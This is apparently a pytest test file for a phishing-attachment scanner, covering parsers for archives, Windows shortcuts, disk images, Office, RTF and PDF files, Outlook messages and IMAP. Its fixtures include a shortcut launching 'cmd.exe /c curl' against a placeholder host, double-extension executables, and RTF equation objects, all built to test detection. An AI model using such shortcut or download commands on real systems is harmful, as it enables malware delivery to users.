"""The less common paths through the 2.0 readers: encoded 7-Zip headers,
RAR 4, shortcut LinkInfo blocks, Joliet ISOs, Outlook edge cases, broken
containers, IMAP failures. Each one is something a real file or server does."""

import email
import email.policy
import imaplib
import struct
import zlib

import pytest

import filebuild as fb
from olebuild import build_msg, write_cfb
from phishhawk import imapfetch
from phishhawk.attachments import Inspector, password_candidates
from phishhawk.formats import archives, disk, documents, lnk, mailparts
from phishhawk.formats.cfb import CompoundFile
from phishhawk.formats.msg import msg_to_bytes, rtf_to_text
from phishhawk.models import Analysis
from phishhawk.pipeline import triage_bytes

from conftest import build_eml


def labels(a):
    return [s.label for s in a.signals]


def attach(data, name, maintype="application", subtype="octet-stream", **kw):
    return triage_bytes(build_eml(attachments=[(data, maintype, subtype, name)], **kw))


# --------------------------------------------------------------------- 7-Zip --

@pytest.mark.parametrize("coder", ["lzma", "lzma2"])
def test_7z_headers_packed_the_way_7zip_writes_them(coder):
    data = fb.seven_zip_encoded(["Invoice.pdf.js", "docs/readme.txt"], coder=coder, directories=("docs",))
    listing = archives.list_7z(data)
    assert listing.names == ["Invoice.pdf.js", "docs/readme.txt"] and not listing.encrypted


def test_7z_with_an_encrypted_header_hides_its_names():
    listing = archives.list_7z(fb.seven_zip_encoded(["a.exe"], coder="aes"))
    assert listing.names == [] and listing.names_hidden and listing.encrypted
    a = attach(fb.seven_zip_encoded(["a.exe"], coder="aes"), "secure.7z")
    assert any("encrypts even its file names" in label for label in labels(a))


def test_7z_with_encrypted_content_but_readable_names():
    listing = archives.list_7z(fb.seven_zip_encoded(["payload.exe"], encrypted_content=True))
    assert listing.names == ["payload.exe"] and listing.encrypted and not listing.names_hidden


def test_7z_headers_that_lie_are_refused():
    data = bytearray(fb.seven_zip_encoded(["a.txt"]))
    struct.pack_into("<Q", data, 12, 10**12)  # next header far beyond the file
    with pytest.raises(ValueError):
        archives.list_7z(bytes(data))
    packed = bytearray(fb.seven_zip_encoded(["a.txt"]))
    packed[32:40] = b"\xff" * 8  # corrupt LZMA stream
    with pytest.raises(ValueError):
        archives.list_7z(bytes(packed))


# ---------------------------------------------------------------------- RAR 4 --

def test_rar4_names_flags_and_unicode():
    listing = archives.list_rar(fb.rar4([("Invoice.pdf.exe", 0x04), ("уииоотивл.txt", 0x200), ("dir", 0xE0)]))
    assert listing.names == ["Invoice.pdf.exe", "уииоотивл.txt"] and listing.encrypted
    assert archives.list_rar(fb.rar4([], encrypted_headers=True)).names_hidden
    with pytest.raises(ValueError):
        archives.list_rar(b"not a rar")


# ------------------------------------------------------------------ shortcuts --

def test_shortcut_linkinfo_and_environment_block():
    details = lnk.parse_lnk(fb.lnk_full("C:\\Windows\\System32\\cmd.exe", "/c curl https://x.top/a",
                                        "%windir%\\system32\\cmd.exe"))
    assert details["target"] == "C:\\Windows\\System32\\cmd.exe"
    assert details["environment_target"] == "%windir%\\system32\\cmd.exe"
    reasons = lnk.suspicious(details)
    assert "starts cmd.exe, curl" in reasons[0] and "downloads from the internet" in reasons
    assert lnk.urls(details) == ["https://x.top/a"]


def test_a_plain_shortcut_is_not_called_malicious():
    details = lnk.parse_lnk(fb.lnk_full("C:\\Program Files\\Notes\\notes.exe"))
    assert lnk.suspicious(details) == []


def test_a_padded_command_line_is_noticed():
    details = lnk.parse_lnk(fb.lnk(target="C:\\a.exe", arguments=" " * 300 + "run", minimized=False))
    assert "hides a long command line" in lnk.suspicious(details)


# ---------------------------------------------------------------- disk images --

def test_joliet_names_and_folders():
    image = fb.iso_tree({"Invoice 2291.pdf.lnk": fb.lnk(), "hidden/run.bat": b"@echo off"}, joliet=True)
    assert [(f.name, f.size) for f in disk.list_iso(image)] == [("Invoice 2291.pdf.lnk", len(fb.lnk())),
                                                                   ("hidden/run.bat", 9)]
    plain = fb.iso_tree({"a.txt": b"x", "sub/b.txt": b"yy"}, joliet=False)
    assert sorted(f.name for f in disk.list_iso(plain)) == ["A.TXT", "SUB/B.TXT"]


def test_virtual_disks_and_unreadable_images():
    vhd = b"\0" * 1024 + b"conectix" + b"\0" * 504
    a = attach(vhd, "invoice.vhd")
    assert any(f.details.get("container", {}).get("kind") == "virtual hard disk" for f in a.attachments)
    assert disk.is_vhd(b"vhdxfile" + b"\0" * 100)
    broken = bytearray(fb.iso({"a.txt": b"x"}))
    broken[16 * 2048 + 1:16 * 2048 + 6] = b"XXXXX"  # the volume descriptor is gone, the marker at 0x8001 too
    with pytest.raises(ValueError):
        disk.list_iso(bytes(broken))


# ----------------------------------------------------------------- documents --

def _docx(parts):
    return fb.plain_zip({"[Content_Types].xml": b"<Types/>", **parts})


def test_office_features_and_embedded_objects():
    doc = _docx({"xl/macrosheets/sheet1.xml": b"<x/>", "word/activeX/activeX1.xml": b"<x/>",
                 "word/embeddings/oleObject1.bin": b"payload", "EncryptionInfo": b"x"})
    found = documents.inspect_ooxml(doc)
    assert {"xlm-macro", "activex", "embedded-object", "encrypted"} <= set(found.features)
    assert found.embedded == [("oleObject1.bin", b"payload")]
    assert documents.inspect_ooxml(b"PK\x03\x04 broken").features == ["corrupt"]
    encrypted = write_cfb({("EncryptedPackage",): b"\0" * 100, ("EncryptionInfo",): b"\0" * 10})
    assert "encrypted" in documents.inspect_ole(encrypted).features
    assert documents.inspect_ole(b"\xd0\xcf\x11\xe0 not ole").features == ["corrupt"]


def test_rtf_objects_found_in_hex_data():
    blob = b"Equation.3".hex()
    rtf = ("{\\rtf1{\\object\\objemb\\objupdate{\\*\\objdata 0105000002000000%s}}}" % blob).encode()
    features = documents.inspect_rtf(rtf).features
    assert {"ole-object", "auto-update", "class-equation.3"} <= set(features)
    package = ("{\\rtf1{\\object{\\*\\objdata %s00}}}" % b"Package".hex()).encode()
    assert "class-package" in documents.inspect_rtf(package).features


def test_pdf_forms_encryption_and_named_embedded_files():
    form = fb.pdf([b"<< /AcroForm << /Fields [] >> /S /SubmitForm >>", b"<< /Encrypt 5 0 R >>"])
    found = documents.inspect_pdf(form)
    assert {"submit-form", "encrypted"} <= set(found.features)
    raw = fb.pdf([fb.pdf_stream(b"/Type /EmbeddedFile", b"MZ" + b"\0" * 50, compress=False)])
    assert documents.inspect_pdf(raw).embedded[0][1].startswith(b"MZ")


# ------------------------------------------------------------ Outlook edge cases --

def test_outlook_codepages_cc_and_unicode_subjects():
    raw = build_msg(subject="Überweisung fällig", sender="buchhaltung@rechnung-portal.top",
                    to=[("Dev", "dev@example-corp.co.uk")], body="Bitte zahlen")
    eml = msg_to_bytes(raw)
    message = email.message_from_bytes(eml, policy=email.policy.default)
    assert message["Subject"] == "Überweisung fällig"
    assert message["From"].addresses[0].addr_spec == "buchhaltung@rechnung-portal.top"


def test_outlook_attachments_with_odd_types_and_deep_nesting():
    inner = {"subject": "level 3", "body": "x"}
    for level in (2, 1):
        inner = {"subject": "level %d" % level, "attachments": [{"name": "m.msg", "message": inner}]}
    raw = build_msg(subject="top", attachments=[
        {"name": "note.txt", "data": b"hello", "mime": "text/plain"},
        {"name": "odd.bin", "data": b"x", "mime": "not a / valid type"},
        {"name": "deep.msg", "message": inner}])
    message = email.message_from_bytes(msg_to_bytes(raw), policy=email.policy.default)
    names = [part.get_filename() for part in message.walk() if part.get_filename()]
    assert "note.txt" in names and "odd.bin" in names


def test_rtf_text_keeps_escapes_and_unicode():
    text, is_html = rtf_to_text(b"{\\rtf1 caf\\'e9 \\u8364? \\{literal\\} \\tab x\\line y}")
    assert text == "café € {literal} \tx\ny" and not is_html


# ---------------------------------------------------------- winmail.dat, invites --

def test_tnef_body_from_compressed_rtf():
    rtf = b"{\\rtf1 Pay at https://tnef-pay.top/x}"
    props = b"\0" * 20 + fb.lzfu(rtf)
    blob = b"\x78\x9f\x3e\x22\x01\x00" + struct.pack("<BII", 1, 0x00069003, len(props)) + props + b"\0\0"
    assert "https://tnef-pay.top/x" in mailparts.parse_tnef(blob).body
    with pytest.raises(ValueError):
        mailparts.parse_tnef(b"not tnef")
    assert mailparts.parse_tnef(b"\x78\x9f\x3e\x22\x01\x00" + b"\x09" + b"\xff" * 20).attachments == []


def test_invites_with_attach_and_method():
    ics = ("BEGIN:VCALENDAR\nMETHOD:PUBLISH\nBEGIN:VEVENT\nATTACH;VALUE=URI:https://files.example/a.pdf\n"
           "ATTENDEE:mailto:a@example.com\nATTENDEE:mailto:b@example.com\nEND:VEVENT\nEND:VCALENDAR\n")
    invite = mailparts.parse_calendar(ics)
    assert invite.urls == ["https://files.example/a.pdf"] and invite.attendees == 2 and invite.method == "PUBLISH"
    assert mailparts.is_calendar(b"\xef\xbb\xbf BEGIN:VCALENDAR\r\n")


# ------------------------------------------------------------- the inspector --

def test_inspector_survives_a_reader_that_breaks(monkeypatch):
    def boom(*_):
        raise RuntimeError("reader bug")

    monkeypatch.setattr(documents, "inspect_rtf", boom)
    a = attach(b"{\\rtf1 hi}", "a.rtf")
    assert any("could not be fully inspected (RuntimeError)" in n for f in a.attachments for n in f.notes)


def test_inspector_budgets_and_broken_containers():
    analysis = Analysis(path="x")
    inspector = Inspector(analysis, lambda url, source: None, type("Scan", (), {"image": lambda *a: [],
                                                                                "pdf": lambda *a: None})(),
                          lambda ioc, data: None, [])
    inspector.bytes = 200 * 1024 * 1024
    parent = inspector.attach("big.zip", "application/zip", b"PK\x03\x04")
    assert parent is None
    for data, name, note in ((b"\x1f\x8b broken", "a.gz", "corrupt gzip"),
                             (b"\0" * 257 + b"ustar" + b"\xff" * 300, "a.tar", "corrupt tar"),
                             (b"\x78\x9f\x3e\x22", "winmail.dat", "0 hidden attachment(s)"),
                             (b"Rar!\x1a\x07\x01\x00" + b"\xff" * 5, "a.rar", "RAR archive")):
        a = attach(data, name)
        assert any(note in n for f in a.attachments for n in f.notes), name


def test_gzip_names():
    a = attach(zlib.compress(b"x"), "not-gzip.gz")
    tgz = fb.plain_zip({"a": b"b"})
    import gzip

    b = attach(gzip.compress(tgz), "bundle.tgz")
    assert [f.filename for f in b.attachments][:2] == ["bundle.tgz", "bundle.tar"]
    assert a.attachments[0].true_type == ""


@pytest.mark.parametrize("text, expected", [
    ("Your invoice. Password: Inv2291.", ["Inv2291"]),
    ("the archive password is 7788", ["7788"]),
    ("Senha: abc123 e PIN 4455", ["abc123", "4455"]),
    ("Reset your password below", []),
    ("password protected document", []),
])
def test_password_candidates(text, expected):
    assert password_candidates(text) == expected


# ------------------------------------------------------------------------ IMAP --

class Server:
    def __init__(self, fail=None, **_):
        self.fail = fail
        self.calls = []

    def starttls(self, ssl_context=None):
        self.calls.append("starttls")

    def authenticate(self, mechanism, callback):
        self.calls.append((mechanism, callback(b"")))

    def login(self, user, password):
        self.calls.append("login")

    def select(self, folder, readonly=False):
        return ("NO", [b""]) if self.fail == "select" else ("OK", [b"1"])

    def uid(self, command, *args):
        if command == "SEARCH":
            return ("NO", [b""]) if self.fail == "search" else ("OK", [b"3 4"])
        if args[1] == "(RFC822.SIZE)":
            return "OK", [b"3 (UID 3 RFC822.SIZE 99999999)" if args[0] == "3" else b"4 (UID 4 RFC822.SIZE 10)"]
        if self.fail == "fetch":
            raise imaplib.IMAP4.error("gone")
        return "OK", [b")"]

    def logout(self):
        raise OSError("already closed")


def source(**kw):
    return imapfetch.ImapSource(host="h.example", user="soc", password="p", **kw)


def test_imap_starttls_oauth_and_skips(monkeypatch):
    server = Server()
    monkeypatch.setattr(imaplib, "IMAP4", lambda host, port, timeout=None: server)
    results = list(imapfetch.fetch(source(starttls=True, port=143, token="t0k"), 1024))
    assert server.calls[0] == "starttls" and server.calls[1][0] == "XOAUTH2"
    assert b"auth=Bearer t0k" in server.calls[1][1]
    assert isinstance(results[0][2], ValueError) and "larger than" in str(results[0][2])  # UID 3 too big
    assert isinstance(results[1][2], ValueError) and "no message" in str(results[1][2])   # UID 4 empty


@pytest.mark.parametrize("fail, message", [("select", "no folder"), ("search", "search failed")])
def test_imap_folder_and_search_failures(monkeypatch, fail, message):
    monkeypatch.setattr(imaplib, "IMAP4_SSL", lambda *a, **k: Server(fail=fail))
    with pytest.raises(imapfetch.ImapError, match=message):
        list(imapfetch.fetch(source(), 1024))


def test_imap_fetch_errors_and_unreachable_servers(monkeypatch):
    monkeypatch.setattr(imaplib, "IMAP4_SSL", lambda *a, **k: Server(fail="fetch"))
    results = list(imapfetch.fetch(source(unseen=True, since=__import__("datetime").date(2026, 9, 1)), 10**9))
    assert all(isinstance(r[2], Exception) for r in results)

    def refuse(*_, **__):
        raise OSError("connection refused")

    monkeypatch.setattr(imaplib, "IMAP4_SSL", refuse)
    with pytest.raises(imapfetch.ImapError, match="cannot connect"):
        list(imapfetch.fetch(source(), 1024))


def test_compound_file_paths():
    cfb = CompoundFile(write_cfb({("A", "b"): b"1", ("c",): b"2"}))
    assert cfb.read_path("a", "B") == b"1" and cfb.read_path("missing") is None
    assert [e.path for e in cfb.storages()] == [("A",)]
